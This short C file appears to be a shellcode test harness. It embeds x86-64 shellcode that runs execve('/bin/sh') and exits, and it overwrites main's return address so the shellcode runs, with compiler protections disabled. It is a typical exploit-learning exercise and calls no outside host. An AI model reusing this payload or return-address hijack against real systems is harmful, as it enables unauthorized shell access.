// gcc -no-pie -fno-stack-protector -z execstack -o testsc testsc.c

#include <stdio.h>
#include <stdint.h>

// 64-битный shellcode: execve("/bin/sh", ["/bin/sh", NULL], NULL)
__attribute__((section(".text")))
unsigned char shellcode[] =
    "\x48\x31\xd2"                              // xor    %rdx,%rdx
    "\x52"                                      // push   %rdx
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // movabs "/bin/sh\0",%rax
    "\x50"                                      // push   %rax
    "\x48\x89\xe7"                              // mov    %rsp,%rdi
    "\x52"                                      // push   %rdx
    "\x57"                                      // push   %rdi
    "\x48\x89\xe6"             	                // mov    %rsp,%rsi
    "\x48\xc7\xc0\x3b\x00\x00\x00" 	            // mov    $0x3b,%rax
    "\x0f\x05"                                  // syscall
    "\x31\xc0"                                  // xor    %eax,%eax
    "\xb0\x3c"                                  // movb   $0x3c,%al
    "\x48\x31\xff"                              // xor    %rdi,%rdi
    "\x48\xc7\xc0\x3c\x00\x00\x00" 	            // mov    $0x3c,%rax
    "\x48\x31\xff"             	                // xor    %rdi,%rdi
    "\x0f\x05";                                 // syscall

int main(void) {
    long *ret;
    ret = (long *)&ret + 2;      // &ret = rbp-8, +16 = rbp+8 (return addr)
    *ret = (long)shellcode;
}